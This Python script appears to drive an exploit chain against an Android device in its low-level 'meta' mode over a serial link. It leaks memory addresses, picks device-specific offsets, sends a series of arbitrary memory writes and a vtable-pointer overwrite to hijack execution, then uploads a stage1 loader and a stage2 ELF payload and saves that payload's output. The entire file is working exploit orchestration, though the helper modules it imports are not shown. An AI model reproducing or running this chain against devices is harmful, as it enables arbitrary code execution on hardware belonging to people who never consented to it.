"""Run a specific stage2 payload path (not bin/stage2.elf), immune to races.

Usage: py -u analysis\\run_payload.py analysis\\stage2_v19.elf
"""

import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import meta_run as M  # noqa: E402
import exploit  # noqa: E402
import leak  # noqa: E402
import meta  # noqa: E402
import profiles  # noqa: E402
import props  # noqa: E402
from logger import log  # noqa: E402

M.TIMEOUT = 600


def send_chain_with(dev, stage2_path):
    lk = leak.leak(dev)
    build = props.read(dev)
    log(props.get(build, 'ro.build.version.name') or 'unknown')
    prof = profiles.from_build_prop(build)

    libc = lk['libc']
    watcher = lk['main_sp'] + prof['watcher_off']
    table = lk['arg_start'] + 14
    base = lk['worker_sp'] + prof['pump_off'] + profiles.RX_OFF
    loader = open('../bin/stage1.bin', 'rb').read()
    pivot = lk['base'] + prof['rx_pivot'] | 1

    chain = exploit.stage_chain(prof, libc, 0x30000, 0x10000, 5, len(loader))
    writes = [(table, pivot)] + [
        (base + 4 * i, word) for i, word in enumerate(chain)
    ]
    triplets = [exploit.write4(watcher, addr, value) for addr, value in writes]
    swap = meta.vptr_write(watcher, table)

    for tr in triplets:
        for frame in tr:
            dev.write(frame)
            time.sleep(0.03)
        dev.drain()
    dev.write(swap[0])
    time.sleep(0.05)
    dev.write(swap[1])
    time.sleep(0.05)
    dev.drain()
    dev.write(swap[2])

    time.sleep(0.5)
    dev.write(loader)
    data = open(stage2_path, 'rb').read()
    log('sending {} ({} bytes)'.format(stage2_path, len(data)))
    time.sleep(0.6)
    for i in range(0, len(data), 1024):
        dev.write(data[i:i + 1024])
        time.sleep(0.03)


def main():
    if len(sys.argv) < 2:
        raise SystemExit('usage: run_payload.py <stage2.elf>')
    path = os.path.abspath(sys.argv[1])
    if not os.path.exists(path):
        alt = os.path.join(HERE, os.path.basename(sys.argv[1]))
        if os.path.exists(alt):
            path = alt
    if not os.path.exists(path):
        raise SystemExit('missing ' + path)
    if not M.wait_preloader():
        print('no preloader', flush=True)
        return
    dev = M.wait_meta()
    print('meta_tst on', dev.port, flush=True)
    send_chain_with(dev, path)
    raw = M.drain(dev, 12)
    with open(os.path.join(HERE, 'payload_out.bin'), 'wb') as fout:
        fout.write(raw)
    print('--- payload output ({}) ---'.format(len(raw)), flush=True)
    print(M.safe(raw), flush=True)
    try:
        dev.close()
    except Exception:
        pass


if __name__ == '__main__':
    main()
